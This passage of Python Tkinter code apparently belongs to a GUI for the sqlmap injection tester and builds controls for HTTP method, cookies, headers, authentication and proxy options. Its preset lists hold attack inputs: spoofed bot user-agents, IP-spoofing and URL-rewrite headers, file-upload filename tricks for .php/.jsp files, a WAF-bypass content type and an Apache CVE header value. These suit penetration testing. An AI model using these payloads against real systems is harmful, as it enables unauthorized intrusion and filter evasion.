        # --method=METHOD     Force usage of given HTTP method (e.g. PUT)
        self.chk_method = ttk.Checkbutton(data_lf)
        self.chk_method_var = tkinter.StringVar()
        self.chk_method.config(text="method", variable=self.chk_method_var, onvalue="on",
                               offvalue="off", command=self.f_method)
        self.chk_method.grid(row=0, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.e_method = ttk.Combobox(data_lf)
        self.e_method_value = tkinter.StringVar()
        self.e_method.config(textvariable=self.e_method_value, state='disabled', width=18)
        self.e_method['values'] = (
            'POST', 'HELLO', 'HELO', 'EHLO', 'LIST', 'HEAD', 'PUT', 'PURGE', 'DELETE', 'OPTION', 'OPTIONS', 'TRACE',
            'TRACK', 'PATCH', 'CONNECT', 'DEBUG', 'GET', '   GET', 'get')
        self.e_method.current(0)
        self.e_method.bind('<<ComboboxSelected>>', self.f_method)
        self.e_method.grid(row=0, column=1, sticky='ew', pady=3)
        # --data=DATA         Data string to be sent through POST
        self.chk_data = ttk.Checkbutton(data_lf)
        self.chk_data_var = tkinter.StringVar()
        self.chk_data.config(text="data", variable=self.chk_data_var, onvalue="on",
                             offvalue="off", command=self.f_data)
        self.chk_data.grid(row=1, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.e_data = tkinter.Text(data_lf, wrap="word", height=3, width=18)
        self.e_data.grid(row=1, column=1, sticky='we', padx=3)
        self.e_data.columnconfigure(0, weight=1)
        # --param-del=PDEL
        self.chk_param_del = ttk.Checkbutton(data_lf)
        self.chk_param_del_var = tkinter.StringVar()
        self.chk_param_del.config(text="param-del", variable=self.chk_param_del_var, onvalue="on",
                                  offvalue="off", command=self.f_param_del)
        self.chk_param_del.grid(row=2, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.e_param_del = ttk.Entry(data_lf, width=18)
        self.e_param_del.grid(row=2, column=1, sticky='ew', pady=3)
        self.e_param_del.columnconfigure(0, weight=1)
        # --cookie=COOKIE     HTTP Cookie header
        self.chk_cookie = ttk.Checkbutton(data_lf)
        self.chk_cookie_var = tkinter.StringVar()
        self.chk_cookie.config(text="cookie", variable=self.chk_cookie_var, onvalue="on",
                               offvalue="off", command=self.f_cookie)
        self.chk_cookie.grid(row=3, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        self.e_cookie = ttk.Entry(data_lf, width=18)
        self.e_cookie.grid(row=3, column=1, sticky='ew', pady=3)
        self.e_cookie.columnconfigure(0, weight=1)
        # --cookie-del=CDEL   Character used for splitting cookie values
        self.chk_cookie_del = ttk.Checkbutton(data_lf)
        self.chk_cookie_del_var = tkinter.StringVar()
        self.chk_cookie_del.config(text="cookie-del", variable=self.chk_cookie_del_var, onvalue="on",
                                   offvalue="off", command=self.f_cookie_del)
        self.chk_cookie_del.grid(row=4, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.e_cookie_del = ttk.Entry(data_lf, width=18)
        self.e_cookie_del.grid(row=4, column=1, sticky='ew', pady=3)
        self.e_cookie_del.columnconfigure(0, weight=1)
        # --live-cookies=L.. Live cookies file used for loading up-to-date values
        self.chk_live_cookies = ttk.Checkbutton(data_lf)
        self.chk_live_cookies_var = tkinter.StringVar()
        self.chk_live_cookies.config(text="live-cookies", variable=self.chk_live_cookies_var, onvalue="on",
                                     offvalue="off", command=self.f_live_cookies)
        self.chk_live_cookies.grid(row=5, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.var_read_live_cookies = tkinter.StringVar()
        self.e_live_cookies = ttk.Entry(data_lf, width=18, textvariable=self.var_read_live_cookies)
        self.e_live_cookies.grid(row=5, column=1, sticky='ew', pady=3)
        self.e_live_cookies.columnconfigure(0, weight=1)
        # --load-cookies=LOC  File containing cookies in Netscape/wget format
        self.chk_load_cookies = ttk.Checkbutton(data_lf)
        self.chk_load_cookies_var = tkinter.StringVar()
        self.chk_load_cookies.config(text="load-cookies", variable=self.chk_load_cookies_var, onvalue="on",
                                     offvalue="off", command=self.f_load_cookies)
        self.chk_load_cookies.grid(row=6, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.var_read_load_cookies = tkinter.StringVar()
        self.e_load_cookies = ttk.Entry(data_lf, width=18, textvariable=self.var_read_load_cookies)
        self.e_load_cookies.grid(row=6, column=1, sticky='ew', pady=3)
        self.e_load_cookies.columnconfigure(0, weight=1)
        # --drop-set-cookie   Ignore Set-Cookie header from response
        self.chk_drop_set_cookie = ttk.Checkbutton(data_lf)
        self.chk_drop_set_sookie_var = tkinter.StringVar()
        self.chk_drop_set_cookie.config(text="drop-set-cookie", variable=self.chk_drop_set_sookie_var, onvalue="on",
                                        offvalue="off", command=self.f_drop_set_cookie)
        self.chk_drop_set_cookie.grid(row=7, column=0, columnspan=2, sticky='w', padx=(0, 8), pady=3)
        # --http1.0
        self.chk_http1 = ttk.Checkbutton(data_lf)
        self.chk_http1_var = tkinter.StringVar()
        self.chk_http1.config(text="http1.0", variable=self.chk_http1_var, onvalue="on",
                              offvalue="off", command=self.f_http1)
        self.chk_http1.grid(row=8, column=0, columnspan=2, sticky='w', padx=(0, 8), pady=3)
        # --http2
        self.chk_http2 = ttk.Checkbutton(data_lf)
        self.chk_http2_var = tkinter.StringVar()
        self.chk_http2.config(text="http2", variable=self.chk_http2_var, onvalue="on",
                              offvalue="off", command=self.f_http2)
        self.chk_http2.grid(row=9, column=0, columnspan=2, sticky='w', padx=(0, 8), pady=3)
        # --user-agent=AGENT  HTTP User-Agent header
        self.chk_user_agent = ttk.Checkbutton(data_lf)
        self.chk_user_agent_var = tkinter.StringVar()
        self.chk_user_agent.config(text="user-agent", variable=self.chk_user_agent_var, onvalue="on",
                                   offvalue="off", command=self.f_user_agent)
        self.chk_user_agent.grid(row=10, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.e_user_agent = ttk.Combobox(data_lf, width=18)
        self.e_ua_value = tkinter.StringVar()
        self.e_user_agent.config(textvariable=self.e_ua_value, state='disabled')
        self.e_user_agent['values'] = [
            # Googlebot 2.1
            'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
            'Googlebot/2.1 (+http://www.googlebot.com/bot.html)', 'Googlebot/2.1 (+http://www.google.com/bot.html)',
            'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) '
            'Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
            'AdsBot-Google (+http://www.google.com/adsbot.html)',
            # Sogou Explorer for Windows XP PC
            # https://www.freebuf.com/sectool/284468.html
            # https://whatmyuseragent.com/browser/se/sogou-explorer
            'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 SE '
            '2.X MetaSr 1.0',
            # Bingbot
            'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
            # YandexBot 3.0
            'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
            # Yahoo! Slurp
            'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)',
            # DuckDuckBot
            'DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)',
            # Baiduspider
            'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
            # Sogou Spider
            'Sogou Pic Spider/3.0( http://www.sogou.com/docs/help/webmasters.htm#07)',
            'Sogou head spider/3.0( http://www.sogou.com/docs/help/webmasters.htm#07)',
            'Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)',
            'Sogou Orion spider/3.0( http://www.sogou.com/docs/help/webmasters.htm#07)',
            'Sogou-Test-Spider/4.0 (compatible; MSIE 5.5; Windows 98)',
            # Exabot
            'Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.5 (like Gecko) (Exabot-Thumbnails)',
            'Mozilla/5.0 (compatible; Exabot/3.0; +http://www.exabot.com/go/robot)',
            # Facebook External Hit
            'facebot', 'facebookexternalhit/1.0 (+http://www.facebook.com/externalhit_uatext.php)',
            'facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)',
            # Alexa Crawler
            'ia_archiver (+http://www.alexa.com/site/help/webmasters; crawler@alexa.com)',
            # Ng-nix, squid, haproxy, etc
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 '
            'Safari/537.36',
            # IBM WebSphere payload
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/537.36 (KHTML, like Gecko) '
            'Chrome/46.0.2490.86 Safari/537.36',
            # Cloudfront
            'Amazon CloudFront',
            # Cloudflare
            'Mozilla/5.0 (compatible; CloudFlare-AlwaysOnline/1.0; +http://www.cloudflare.com/always-online) '
            'AppleWebKit/534.34',
            # Akamai
            'Akamai Edge',
            # Struts
            '205f5f5f5f205f5f5f5f20202020202020205f5f5f20205f20205f202020205f5f5f0a2f205f5f5f7c5f5f5f205 '
            'c2020202020202f205f205c7c207c7c207c202028205f20290a5c5f5f5f205c205f5f29207c5f5f5f5f7c207c207c207c207 '
            'c7c207c5f202f205f205c0a205f5f5f29202f205f5f2f5f5f5f5f5f7c207c5f7c207c5f5f2020205f7c20285f29207c0a7c5f5 '
            'f5f5f2f5f5f5f5f5f7c20202020205c5f5f5f2f2020207c5f7c20205c5f5f5f2f0a0a20202020e58584e5bc9fefbc8ce591a8e69 '
            'cabe4ba86efbc8ce697a9e782b9e59b9ee58ebbe590a7efbc8ce5bdb1e5938de4b88de5a4a70a',
            # AppScan
            'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
            'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)'
        ]
        self.e_user_agent.current(0)
        self.e_user_agent.bind('<<ComboboxSelected>>', self.f_user_agent)
        self.e_user_agent.grid(row=10, column=1, sticky='ew', pady=3)
        # --random-agent      Use randomly selected HTTP User-Agent header value
        self.chk_random_agent = ttk.Checkbutton(data_lf)
        self.chk_random_agent_var = tkinter.StringVar()
        self.chk_random_agent.config(text="random-agent", variable=self.chk_random_agent_var, onvalue="on",
                                     offvalue="off",
                                     command=self.f_random_agent)
        self.chk_random_agent.grid(row=11, column=0, columnspan=2, sticky='w', padx=(0, 8), pady=3)
        # --host=HOST         HTTP Host header
        self.chk_host = ttk.Checkbutton(data_lf)
        self.chk_host_var = tkinter.StringVar()
        self.chk_host.config(text="host", variable=self.chk_host_var, onvalue="on",
                             offvalue="off", command=self.f_host)
        self.chk_host.grid(row=12, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.e_host = ttk.Combobox(data_lf)
        self.e_host_value = tkinter.StringVar()
        self.e_host.config(textvariable=self.e_host_value, state='disabled', width=18)
        self.e_host['values'] = ('www.example.com http://realip', 'www.example.com http://realip:80',
                                 'www.example.com https://realip', 'www.example.com https://realip:443',
                                 'www.example.com(command run)')
        self.e_host.current(0)
        self.e_host.bind('<<ComboboxSelected>>', self.f_host)
        self.e_host.grid(row=12, column=1, sticky='ew', pady=3)
        self.e_host.columnconfigure(0, weight=1)
        # --referer=REFERER   HTTP Referer header
        self.chk_referer = ttk.Checkbutton(data_lf)
        self.chk_referer_var = tkinter.StringVar()
        self.chk_referer.config(text="referer", variable=self.chk_referer_var, onvalue="on",
                                offvalue="off", command=self.f_referer)
        self.chk_referer.grid(row=13, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.e_referer = ttk.Combobox(data_lf)
        self.e_referer_value = tkinter.StringVar()
        self.e_referer.config(textvariable=self.e_referer_value, state='disabled', width=18)
        self.e_referer['values'] = ('http://127.0.0.1', 'https://127.0.0.1')
        self.e_referer.current(0)
        self.e_referer.bind('<<ComboboxSelected>>', self.f_referer)
        self.e_referer.grid(row=13, column=1, sticky='ew', pady=3)
        self.e_referer.columnconfigure(0, weight=1)
        # -H HEADER, --hea..  Extra header (e.g. "X-Forwarded-For: 127.0.0.1")
        self.chk_header = ttk.Checkbutton(data_lf)
        self.chk_header_var = tkinter.StringVar()
        self.chk_header.config(text="Extra header", variable=self.chk_header_var, onvalue="on",
                               offvalue="off", command=self.f_header)
        self.chk_header.grid(row=14, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.e_header = ttk.Combobox(data_lf)
        self.e_header_value = tkinter.StringVar()
        self.e_header.config(textvariable=self.e_header_value, state='disabled', width=18)
        self.e_header['values'] = (
            'X-Forwarded-For: 127.0.0.1', 'X-Forwarded-For: localhost', 'X-Forwarded-For%00: 127.0.0.1',
            'X-Forwarded-Proto: 127.0.0.1', 'X-Forwarded-For: 2001:db8::1', 'X-Real-IP: 192.168.1.10',
            'X-Originating-IP: 127.0.0.1', 'X-Remote-IP: 127.0.0.1', 'X-Remote-addr: 127.0.0.1',
            'X-Pingback-Forwarded-For: 127.0.0.1', 'X-Pingback: 127.0.0.1', 'X-Client-IP: 127.0.0.1',
            'X-Original-URL: http://www.malwaresite.com/index.php',
            'Content-disposition: form-data; name="file"; filename="test.php"',
            'X-Rewrite-URL: http://www.malwaresite.com/index.php', 'CF-Connecting-IP: 127.0.0.1',
            'Cf-Ray: 230b030023ae2822-SJC', 'Cf-Ipcountry: US', 'True-Client-IP: 127.0.0.1',
            'X-Forwarded-For: realip cloudflare, akamai, amazon, etc', 'X-Forwarded-For: 192.0.2.4,192.0.2.3,192.0.2.2',
            'X-Forwarded-For: your ip, destination server ip', 'X-Forwarded-For: client1,proxy1,proxy2',
            'X-Etag: 127.0.0.1', 'Incap-Proxy-ID: 127.0.0.1', 'X-PINGOTHER: 127.0.0.1', 'Akamai-Origin-Hop: 1',
            'Akamai-Origin-Hop: 2', 'X-Forwarded-Host: 127.0.0.1', 'X-Forwarded-Scheme: http', 'X-Pull: KeyCDN',
            'X-Requested-With: XMLHttpRequest', 'X-Forwarded-Port: 80', 'X-Forwarded-Port: 443', 'Front-End-Https: on',
            'X-HTTP-Method-Override: DELETE', 'X-HTTP-Method-Override: PUT', 'X-Att-Deviceid: GT-P7320/P7320XXLPG',
            'x-wap-profile: http://wap.samsungmobile.com/uaprof/SGH-I777.xml',
            'X-Csrf-Token: i8XNjC4b8KVok4uw5RftR38Wgp2BFwql', 'X-Frame-Options: DENY', 'X-Frame-Options: SAMEORIGIN',
            'X-Frame-Options: ALLOW-FROM uri', 'Service: alternate.example.net',
            'X-Generator: Drupal 7 (http://drupal.org)', 'X-Powered-By: ASP.NET',
            'Upgrade: HTTP/2.0, SHTTP/1.3, IRC/6.9, RTA/x11', 'X-XSS-Protection: 1; mode=block',
            'X-WebKit-CSP: default-src self', 'X-Content-Type-Options: nosniff', 'X-Powered-By: PHP/5.4.0',
            'X-UA-Compatible: IE=EmulateIE7', 'X-UA-Compatible: IE=edge', 'X-UA-Compatible: Chrome=1',
            'X-Content-Duration: 42.666', 'Proxy-Connection: keep-alive', 'X-UIDH: ...', 'Upgrade-Insecure-Requests: 1',
            'Vary: *', 'Vary: Accept-Language', 'TSV: ?', 'Location: http://localhost/targetpage.php',
            'Location: http://127.0.0.1', 'Location: http://localhost/', 'Upgrade: h2c', 'SOAPAction: urn: AdminService'
        )
        self.e_header.current(0)
        self.e_header.bind('<<ComboboxSelected>>', self.f_header)
        self.e_header.grid(row=14, column=1, sticky='ew', pady=3)
        self.e_header.columnconfigure(0, weight=1)
        #    --headers=HEADERS   Extra headers (e.g. "Accept-Language: fr\nETag: 123") --headers=@file.txt
        self.chk_headers = ttk.Checkbutton(data_lf)
        self.chk_headers_var = tkinter.StringVar()
        self.chk_headers.config(text="headers", variable=self.chk_headers_var, onvalue="on",
                                offvalue="off", command=self.f_headers)
        self.chk_headers.grid(row=15, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.e_headers = ttk.Combobox(data_lf, width=18)
        self.e_headers_value = tkinter.StringVar()
        self.e_headers.config(textvariable=self.e_headers_value, state='disabled')
        self.e_headers['values'] = (
            'Content-Type: application/x-www-form-urlencoded',
            # Squid, Haproxy, Varnish and over Cache-Proxy Pragma Detection
            'Pragma: akamai-x-cache-on, akamai-x-cache-remote-on, akamai-x-check-cacheable, akamai-x-get-cache-key, '
            'akamai-x-get-extracted-values, akamai-x-get-ssl-client-session-id, akamai-x-get-true-cache-key, '
            'akamai-x-serial-no, akamai-x-get-request-id, akamai-x-get-nonces, akamai-x-get-client-ip, '
            'akamai-x-feo-trace',
            # Akamai, Cloud-flare, etc. Cache-Service Pragma Detection
            'Pragma: akamai-x-cache-on, akamai-x-cache-remote-on, akamai-x-check-cacheable, akamai-x-get-cache-key, '
            'akamai-x-get-extracted-values, akamai-x-get-nonces, akamai-x-get-ssl-client-session-id, '
            'akamai-x-get-true-cache-key, akamai-x-serial-no',
            # Drupal json
            'Accept: application/json',
            # Tomcat
            'Content-Disposition: form-data; name=\"file\"; filename=bc.php',
            'Content-Disposition: form-data; name=\"file\"; filename=\"abc.php',
            "Content-Disposition: form-data; name=\"file\"; filename=\'abc.php\'",
            'Content-Disposition: form-data;name=\"myfile\"; filename=\"p3.txt\";filename=\"t3.jsp\"',
            'Content-Disposition: form-data;name=\"myfile\";; filename=\"t3.jsp\"',
            'Pragma: no-cache', 'Via: 1.1 v1-akamaitech.net(ghost) (AkamaiGHost), 1.1 akamai.net(ghost) (AkamaiGHost)',
            'Via: 1.1 cloudflare', 'Accept-Language: en', 'Origin: http://www.domain.com',
            'Forwarded: for=192.0.2.43, for=198.51.100.17', 'Forwarded: for=192.0.2.60; proto=http; by=203.0.113.43',
            'From: user@example.com', 'Proxy-Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==',
            'Via: 1.0 fred, 1.1 domain.com (Apache/1.1)', 'Content-Type: application/hta', 'Content-Type: invalid',
            'Content-Type: example', 'Content-Type: multipart', 'Content-Type: multipart/digest',
            'Content-Type: text/html; charset=utf-8', 'Content-Type: multipart/digest; boundary=0000',
            'Content-Type: multipart/; boundary=0000', 'Content-Type: multipart/fake',
            'Content-Type: multipart/fake; boundary=0000', 'Content-Type: multipart/mixed',
            'Content-Type: multipart/mixed; boundary=0000', 'Content-Type: multipart/alternative',
            'Content-Type: multipart/alternative; boundary=0000', 'Content-Type: multipart/related',
            'Content-Type: multipart/related; boundary=0000', 'Content-Type: multipart/form-data',
            'Content-Type: multipart/form-data; boundary=0000', 'Content-Type: multipart/form-data ; boundary=0000',
            'Content-Type: multipart/form-data, boundary=0000', 'Content-Type: multipart/form-data boundary=0000',
            'Content-Type: multipart/form-data; boundary=\"0000\"',
            "Content-Type: multipart/form-data; boundary=0000\'",
            'Content-Type: multipart/form-data; boundary911=0000', 'Content-Type: multipart/form-data; boundary =0000',
            'Content-Type: multipart/form-data; boundary= 0000',
            'Content-Type: multipart/form-data; boundary=0000 1111',
            'Content-Type: multipart/form-data; boundary=0000,1111',
            'Content-Type: multipart/form-data; boundary=0000 boundary',
            'Content-Type: multipart/form-data; boundary=0000 boundary=0000',
            'Content-Type: multipart/form-data; boundary=0000, boundary',
            'Content-Type: multipart/form-data; boundary=0000; boundary', 'Content-Type: multipart/fake; boundary=0000',
            'Content-Type: multipart/mixed; boundary=0000', 'Content-Type: multipart/alternative; boundary=0000',
            'Content-Type: multipart/related; boundary=0000', 'Content-Type: multipart/form-data; boundary=0000',
            'Content-Type: multipart/fake ; boundary=0000', 'Content-Type: multipart/fake, boundary=0000',
            'Content-Type: multipart/fake; boundary=\"0000\"', "Content-Type: multipart/fake; boundary=0000\'",
            'Content-Type: multipart/fake boundary=0000', 'Content-Type: multipart/form-data-rand; boundary=0000',
            'Content-Type: multipart/form-data-rand boundary=0000',
            'Content-Type: multipart/form-data-rand ; boundary=0000',
            'Content-Type: multipart/form-data-rand, boundary=0000',
            'Content-Type: multipart/form-data-rand; boundary=\"0000\"',
            "Content-Type: multipart/form-data-rand; boundary=0000\'",
            'Content-Type: multipart/signed', 'Content-Type: multipart/signed; boundary=0000',
            'Content-Type: multipart/encrypted', 'Content-Type: multipart/encrypted; boundary=0000',
            'Content-Type: multipart/example; boundary=0000', 'Content-Type: multipart/example; boundary=0000',
            'Content-Type: text/cmd', 'Content-Type: text/css', 'Content-Type: text/csv', 'Content-Type: text/example',
            'Content-Type: text/fake', 'Content-Type: text/html', 'Content-Type: text/javascript',
            'Content-Type: text/plain', 'Content-Type: text/rtf', 'Content-Type: text/vnd.abc',
            'Content-Type: text/xml', 'Content-Type: text/x-gwt-rpc', 'Content-Type: text/x-jquery-tmpl',
            'Content-Type: text/x-markdown', 'Content-Type: application/example', 'Content-Type: application/fake',
            'Content-Type: application/ecmascript', 'Content-Type: application/json',
            'Content-Type: application/javascript', 'Content-Type: application/xml',
            'Content-Type: application/x-javascript', 'Content-Type: application/x-latex',
            'Content-Type: application/x-www-form-urlencoded-rand', 'Content-Type: text/html; charset=utf-7',
            'Accept-Charset: utf-7', 'Content-Type: application/json;charset=UTF-8',
            'Content-Type: application/json;charset=UTF-7',
            # BIG-IP Json Request attack to Bypass WAF
            'Content-Type: application/x-www-form-urlencoded; charset=utf-8;json', 'Content-Type: application/json',
            'Content-Language: en, ase, ru', 'Content-Length: 1348', 'Content-MD5: Q2hlY2sgSW50ZWdyaXR5IQ==',
            'Content-Range: bytes 88080384-160993791/160993792', 'Connection: Upgrade',
            # Apache CVE-2017-7659
            'HTTP2-Settings: AAMAAABkAAQAAP___', 'Connection: Upgrade', 'Connection: Upgrade HTTP2-Settings',
            'Upgrade: HTTP/2.0, SHTTP/1.3, IRC/6.9, RTA/x11', 'Connection: close', 'Connection: keep-alive',
            'Date: Tue, 15 Nov 1994 08:12:31 GMT', 'Accept: text/plain', 'Accept-Encoding: gzip, deflate',
            'Accept-Charset: utf-8', 'Accept-Encoding: gzip', 'Accept-Encoding: deflate', 'Accept-Ranges: bytes',
            'Accept: /', 'Accept-Encoding: gzip, deflate, sdch', 'Allow: OPTIONS, GET, HEAD',
            'Cache-Control: no-cache', 'Cache-Control: no-store', 'Cache-Control: max-age=3600',
            'Cache-Control: max-stale=0', 'Cache-Control: min-fresh=0', 'Cache-Control: no-transform',
            'Cache-Control: only-if-cached', 'Cache-Control: cache-extension',
            'Expires: Tue, 31 Jan 2012 15:02:53 GMT', 'Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==',
            'Server: Apache/2.2.17 (Win32) PHP/5.3.5', 'If-Modified-Since: Sat, 29 Oct 1994 19:43:31 GMT',
            'If-Unmodified-Since: Sat, 29 Oct 1994 19:43:31 GMT', 'If-Range: 737060cd8c284d8af7ad3082f209582d',
            'ETag: 56d-9989200-1132c580', 'Expect: 100-continue', 'TE: trailers, deflate', 'Transfer-Encoding: chunked',
            'Warning: 199 Miscellaneous warning', 'Max-Forwards: 10', 'Range: bytes=500-999'
        )
        self.e_headers.current(0)
        self.e_headers.bind('<<ComboboxSelected>>', self.f_headers)
        self.e_headers.grid(row=15, column=1, sticky='ew', pady=3)
        # --headers=@file.txt load your own txt file with headers
        self.chk_load_headers = ttk.Checkbutton(data_lf)
        self.chk_load_headers_var = tkinter.StringVar()
        self.chk_load_headers.config(text="load-headers", variable=self.chk_load_headers_var, onvalue="on",
                                     offvalue="off", command=self.f_load_headers)
        self.chk_load_headers.grid(row=16, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.var_read_load_headers = tkinter.StringVar()
        self.e_load_headers = ttk.Entry(data_lf, width=18, textvariable=self.var_read_load_headers)
        self.e_load_headers.grid(row=16, column=1, sticky='ew', pady=3)
        self.e_load_headers.columnconfigure(0, weight=1)
        # DATA 2
        data_lf_2 = ttk.Labelframe(data2, text='Connection & authentication')
        data_lf_2.columnconfigure(1, weight=1)
        data_lf_2.grid(row=0, column=0, pady=10, ipadx=3, ipady=3, sticky='we')
        # --auth-type=ATYPE   HTTP authentication type (Basic, Digest or NTLM)
        self.chk_auth_type = ttk.Checkbutton(data_lf_2)
        self.chk_auth_type_var = tkinter.StringVar()
        self.chk_auth_type.config(text="auth-type", variable=self.chk_auth_type_var, onvalue="on",
                                  offvalue="off", command=self.f_auth_type)
        self.chk_auth_type.grid(row=0, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.e_auth_type = ttk.Combobox(data_lf_2, width=18)
        self.e_auth_type_value = tkinter.StringVar()
        self.e_auth_type.config(textvariable=self.e_auth_type_value, state='disabled')
        self.e_auth_type['values'] = ('Basic', 'Digest', 'Bearer', 'NTLM', 'PKI')
        self.e_auth_type.current(0)
        self.e_auth_type.bind('<<ComboboxSelected>>', self.f_auth_type)
        self.e_auth_type.grid(row=0, column=1, sticky='ew', pady=3)
        self.e_auth_type.columnconfigure(0, weight=1)
        # --auth-cred=ACRED   HTTP authentication credentials (name:password)
        self.chk_auth_cred = ttk.Checkbutton(data_lf_2)
        self.chk_auth_cred_var = tkinter.StringVar()
        self.chk_auth_cred.config(text="auth-cred", variable=self.chk_auth_cred_var, onvalue="on",
                                  offvalue="off", command=self.f_auth_cred)
        self.chk_auth_cred.grid(row=1, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.e_auth_cred = ttk.Combobox(data_lf_2, width=18)
        self.e_auth_cred_value = tkinter.StringVar()
        self.e_auth_cred.config(textvariable=self.e_auth_cred_value, state='disabled')
        self.e_auth_cred['values'] = 'name:password'
        self.e_auth_cred.current(0)
        self.e_auth_cred.bind('<<ComboboxSelected>>', self.f_auth_cred)
        self.e_auth_cred.grid(row=1, column=1, sticky='ew', pady=3)
        self.e_auth_cred.columnconfigure(0, weight=1)
        # --auth-file=AUTH..  HTTP authentication PEM cert/private key file
        self.chk_auth_file = ttk.Checkbutton(data_lf_2)
        self.chk_auth_file_var = tkinter.StringVar()
        self.chk_auth_file.config(text="auth-file", variable=self.chk_auth_file_var, onvalue="on",
                                  offvalue="off", command=self.f_auth_file)
        self.chk_auth_file.grid(row=2, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.var_auth_file = tkinter.StringVar()
        self.e_auth_file = ttk.Entry(data_lf_2, width=18, textvariable=self.var_auth_file)
        self.e_auth_file.grid(row=2, column=1, sticky='ew', pady=3)
        self.e_auth_file.columnconfigure(0, weight=1)
        # --proxy=PROXY       Use a HTTP proxy to connect to the target url
        self.chk_proxy = ttk.Checkbutton(data_lf_2)
        self.chk_proxy_var = tkinter.StringVar()
        self.chk_proxy.config(text="proxy", variable=self.chk_proxy_var, onvalue="on",
                              offvalue="off", command=self.f_proxy)
        self.chk_proxy.grid(row=3, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.e_proxy = ttk.Combobox(data_lf_2)
        self.e_proxy_value = tkinter.StringVar()
        self.e_proxy.config(textvariable=self.e_proxy_value, state='disabled', width=18)
        self.e_proxy['values'] = ('http://127.0.0.1:8080', 'https://127.0.0.1:8080', 'socks4://localhost:8080',
                                  'socks5://localhost:8080')
        self.e_proxy.current(0)
        self.e_proxy.bind('<<ttk.ComboboxSelected>>', self.f_proxy)
        self.e_proxy.grid(row=3, column=1, sticky='ew', pady=3)
        self.e_proxy.columnconfigure(0, weight=1)
        # --proxy-cred=PCRED  HTTP proxy authentication credentials (name:password)
        self.chk_proxy_cred = ttk.Checkbutton(data_lf_2)
        self.chk_proxy_cred_var = tkinter.StringVar()
        self.chk_proxy_cred.config(text="proxy-cred", variable=self.chk_proxy_cred_var, onvalue="on",
                                   offvalue="off", command=self.f_proxy_cred)
        self.chk_proxy_cred.grid(row=4, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.e_proxy_cred = ttk.Combobox(data_lf_2, width=18)
        self.e_proxy_cred_value = tkinter.StringVar()
        self.e_proxy_cred.config(textvariable=self.e_proxy_cred_value, state='disabled')
        self.e_proxy_cred['values'] = 'name:password'
        self.e_proxy_cred.current(0)
        self.e_proxy_cred.bind('<<ttk.ComboboxSelected>>', self.f_proxy_cred)
        self.e_proxy_cred.grid(row=4, column=1, sticky='ew', pady=3)
        self.e_proxy_cred.columnconfigure(0, weight=1)
        # --proxy-file=PRO..  Load proxy list from a file
        self.chk_proxy_file = ttk.Checkbutton(data_lf_2)
        self.chk_proxy_file_var = tkinter.StringVar()
        self.chk_proxy_file.config(text="proxy-file", variable=self.chk_proxy_file_var, onvalue="on",
                                   offvalue="off", command=self.f_proxy_file)
        self.chk_proxy_file.grid(row=5, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.chk_read_proxy_file_var = tkinter.StringVar()
        self.e_proxy_file = ttk.Entry(data_lf_2, width=18, textvariable=self.chk_read_proxy_file_var)
        self.e_proxy_file.grid(row=5, column=1, sticky='ew', pady=3)
        self.e_proxy_file.columnconfigure(0, weight=1)
        # --proxy-freq=PRO.. Requests between change of proxy from a given list
        self.chk_proxy_freq = ttk.Checkbutton(data_lf_2)
        self.chk_proxy_freq_var = tkinter.StringVar()
        self.chk_proxy_freq.config(text="proxy-freq", variable=self.chk_proxy_freq_var, onvalue="on",
                                   offvalue="off", command=self.f_proxy_freq)
        self.chk_proxy_freq.grid(row=6, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.e_proxy_freq = ttk.Combobox(data_lf_2)
        self.e_proxy_freq_value = tkinter.StringVar()
        self.e_proxy_freq.config(textvariable=self.e_proxy_freq_value, state='disabled', width=18)
        self.e_proxy_freq['values'] = ('1', '2', '3', '4', '5')
        self.e_proxy_freq.current(0)
